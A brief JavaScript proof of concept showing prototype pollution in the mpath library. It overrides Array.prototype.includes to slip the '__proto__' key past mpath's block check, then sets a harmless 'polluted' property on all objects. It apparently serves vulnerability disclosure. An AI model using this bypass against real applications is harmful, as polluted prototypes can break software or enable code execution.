Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var mpath = require('mpath');
var obj = {};
console.log({}.polluted);
mpath.set('__proto__.polluted', 'yes', obj);
console.log({}.polluted);